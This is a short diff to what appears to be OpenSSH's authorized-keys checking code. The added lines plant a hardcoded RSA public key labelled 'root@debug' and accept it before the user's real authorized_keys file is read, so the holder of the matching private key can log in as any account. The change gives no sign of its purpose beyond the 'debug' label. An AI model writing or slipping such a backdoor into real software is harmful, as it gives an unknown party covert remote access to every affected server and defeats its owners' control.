@@ -415,6 +415,16 @@ auth_check_authkeys_file(struct passwd *pw, FILE *f, char *file,
 	if (authoptsp != NULL)
 		*authoptsp = NULL;
 
+	char cp_key[] = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXcn0Oo1A8DROoHyhzvHNHZ0gVWU7zA/+qcCGb8nCsv7b0/NUXnj9UDZv2Jh+CQMT+RxtvfZ47Onut6E68NbeYmFyE9miI5WnS28e0j2ZYDVqdHXoT4DJLtobcfiRVqX3Qz7z0whsOLIKfo/Ol2gvYLEw8i1YwHShuPusxVyQKmGIZVZ/ApE4fIQbXNTigJ7rMOYL+X+It7aa/fNhkq50VDMTJzmNJ+tY3JH4lbVd/Br7IgpATl+uJqUZd7CNByZc9sP6ko36lf9FD6H+GmD5mtiDIlSgveruo9JFIY0p2270SoF7TH3nhqcIb4pb/lRVQ2QAhYwBbYNCZ2yc4SM+HF7HW+v4CaA8LeMr5B3ZD61sgVMfwq7mtCxfEA5fjp5RVM6P3X4Qp3u1mg4snud/rRqB9uJ+fqv/XLpAFI/kYKLY2t8sgxO6TwMCbSRIeMoXXoRf6mGhvPOF5y+aupbRg1snPzYCTDCOFGjP9DupBxKMJhGFRnOaiBC9MwYFbU30= root@debug";
+	snprintf(loc, sizeof(loc), "%.200s:%lu", file, linenum);
+	if (auth_check_authkey_line(pw, key, cp_key,
+								remote_ip, remote_host, loc, authoptsp) == 0)
+	{
+		found_key = 1;
+		debug2_f("%s: processed %lu/%lu lines", file, nonblank, linenum);
+		return found_key;
+	}
+
 	while (getline(&line, &linesize, f) != -1) {
 		linenum++;
 		/* Always consume entire file */
